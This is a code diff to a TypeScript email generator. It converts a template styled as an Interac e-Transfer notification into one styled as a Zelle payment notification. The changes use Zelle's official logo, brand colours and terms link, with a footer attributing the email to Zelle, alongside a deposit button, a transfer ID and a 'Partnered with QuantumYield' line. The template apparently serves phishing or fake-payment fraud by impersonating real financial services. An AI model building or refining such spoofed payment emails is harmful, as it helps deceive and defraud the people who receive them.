@@ -45,7 +45,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Interac e-Transfer</title>
+  <title>Zelle Payment</title>
   <style>
     body {
       margin: 0;
@@ -117,7 +117,8 @@ export function generateInteracEmailHtml(data: EmailData): string {
       margin-bottom: 12px;
     }
     .amount-box {
-      background-color: #FDB913;
+      background-color: #6D1ED4;
+      color: #ffffff;
       padding: 16px;
       border-radius: 6px;
       font-size: 18px;
@@ -139,27 +140,36 @@ export function generateInteracEmailHtml(data: EmailData): string {
       margin-top: 0;
     }
     .detail-row {
-      display: flex;
-      justify-content: space-between;
-      padding: 12px 0;
+      display: table;
+      width: 100%;
+      border-collapse: collapse;
       border-bottom: 1px solid #f0f0f0;
+      box-sizing: border-box;
     }
     .detail-row:last-child {
       border-bottom: none;
     }
     .detail-label {
+      display: table-cell;
+      width: 45%;
       font-weight: 600;
       color: #666666;
       font-size: 14px;
+      padding: 12px 12px 12px 0;
+      vertical-align: middle;
     }
     .detail-value {
+      display: table-cell;
+      width: 55%;
       color: #000000;
       font-size: 14px;
       text-align: right;
+      padding: 12px 0;
+      vertical-align: middle;
     }
     .message-box {
       background-color: #f9f9f9;
-      border-left: 4px solid #FDB913;
+      border-left: 4px solid #6D1ED4;
       padding: 16px;
       margin: 20px 0;
       border-radius: 4px;
@@ -170,8 +180,8 @@ export function generateInteracEmailHtml(data: EmailData): string {
       color: #000000;
     }
     .security-section {
-      background-color: #fff9e6;
-      border: 2px solid #FDB913;
+      background-color: #f5f0ff;
+      border: 2px solid #6D1ED4;
       border-radius: 8px;
       padding: 20px;
       margin: 20px 0;
@@ -223,8 +233,8 @@ export function generateInteracEmailHtml(data: EmailData): string {
       margin: 32px 0;
     }
     .deposit-button {
-      background-color: #FDB913;
-      color: #000000;
+      background-color: #6D1ED4;
+      color: #ffffff;
       padding: 14px 30px;
       font-weight: bold;
       text-decoration: none;
@@ -234,7 +244,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
       transition: background-color 0.2s;
     }
     .deposit-button:hover {
-      background-color: #e5a811;
+      background-color: #5A18B0;
     }
     .instructions {
       background-color: #f9f9f9;
@@ -295,8 +305,18 @@ export function generateInteracEmailHtml(data: EmailData): string {
 <body>
   <div class="email-container">
     <div class="topbar">
-      <div class="topbar-left">
-        <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="INTERAC e-Transfer" height="50">
+        <div class="topbar-left">
+        <table cellpadding="0" cellspacing="0" border="0" style="display:inline-table;">
+          <tr>
+            <td width="40" height="40" style="background:#6D1ED4;border-radius:8px;text-align:center;vertical-align:middle;padding:0;">
+              <img src="https://www.zellepay.com/sites/default/files/2023-08/Zelle_Logomark_White.png"
+                   alt="Zelle"
+                   width="24" height="24"
+                   style="display:block;margin:8px auto;width:24px;height:24px;border:0;"
+              />
+            </td>
+          </tr>
+        </table>
         <div class="dba">Partnered with QuantumYield</div>
       </div>
       <div class="topbar-right">
@@ -307,30 +327,38 @@ export function generateInteracEmailHtml(data: EmailData): string {
     <div class="content-wrapper">
         <div class="greeting-section">
           <h1>Hi ${recipientName},</h1>
-          <p>You've received a secure Interac e-Transfer.</p>
+          <p>You&apos;ve received a secure Zelle payment.</p>
 
           <div class="amount-box">
-            Amount: $${formattedAmount} CAD
+            Amount: $${formattedAmount} USD
           </div>
 
           <div class="details-card">
             <h3>Transfer Details</h3>
-            <div class="detail-row">
-              <span class="detail-label">Date:</span>
-              <span class="detail-value">${currentDate}</span>
-            </div>
-            <div class="detail-row">
-              <span class="detail-label">From:</span>
-              <span class="detail-value">${institution}</span>
-            </div>
-            <div class="detail-row">
-              <span class="detail-label">Transfer ID:</span>
-              <span class="detail-value">${transferId}</span>
-            </div>
-            <div class="detail-row">
-              <span class="detail-label">Amount:</span>
-              <span class="detail-value">$${formattedAmount} CAD</span>
-            </div>
+            <table class="detail-row" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;width:100%;border-bottom:1px solid #f0f0f0;">
+              <tr>
+                <td class="detail-label" style="width:45%;font-weight:600;color:#666666;font-size:14px;padding:12px 12px 12px 0;vertical-align:middle;text-align:left;">Date:</td>
+                <td class="detail-value" style="width:55%;color:#000000;font-size:14px;font-weight:500;padding:12px 0;vertical-align:middle;text-align:right;">${currentDate}</td>
+              </tr>
+            </table>
+            <table class="detail-row" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;width:100%;border-bottom:1px solid #f0f0f0;">
+              <tr>
+                <td class="detail-label" style="width:45%;font-weight:600;color:#666666;font-size:14px;padding:12px 12px 12px 0;vertical-align:middle;text-align:left;">From:</td>
+                <td class="detail-value" style="width:55%;color:#000000;font-size:14px;font-weight:500;padding:12px 0;vertical-align:middle;text-align:right;">${institution}</td>
+              </tr>
+            </table>
+            <table class="detail-row" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;width:100%;border-bottom:1px solid #f0f0f0;">
+              <tr>
+                <td class="detail-label" style="width:45%;font-weight:600;color:#666666;font-size:14px;padding:12px 12px 12px 0;vertical-align:middle;text-align:left;">Transfer ID:</td>
+                <td class="detail-value" style="width:55%;color:#000000;font-size:14px;font-weight:500;padding:12px 0;vertical-align:middle;text-align:right;">${transferId}</td>
+              </tr>
+            </table>
+            <table class="detail-row" width="100%" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;width:100%;border-bottom:none;">
+              <tr>
+                <td class="detail-label" style="width:45%;font-weight:600;color:#666666;font-size:14px;padding:12px 12px 12px 0;vertical-align:middle;text-align:left;">Amount:</td>
+                <td class="detail-value" style="width:55%;color:#000000;font-size:14px;font-weight:500;padding:12px 0;vertical-align:middle;text-align:right;">$${formattedAmount} USD</td>
+              </tr>
+            </table>
           </div>
 
           ${
@@ -380,9 +408,9 @@ export function generateInteracEmailHtml(data: EmailData): string {
     </div>
 
     <div class="footer">
-      <p>© 2025 Interac Corp. This email was sent to you by Interac Corp., the owner of the Interac e-Transfer service, on behalf of <strong>${institution}</strong> at <strong>${senderName}</strong>.</p>
+      <p>© ${new Date().getFullYear()} Zelle. This email was sent on behalf of <strong>${institution}</strong> at <strong>${senderName}</strong>.</p>
       <p style="margin-top: 8px;">
-        <a href="https://www.interac.ca/en/interac-e-transfer-terms-of-use/">Terms of Use</a>
+        <a href="https://www.zellepay.com/terms-of-use">Terms of Use</a>
       </p>
       <p style="margin-top: 8px;">This is an automated email. Please do not reply to this message.</p>
     </div>
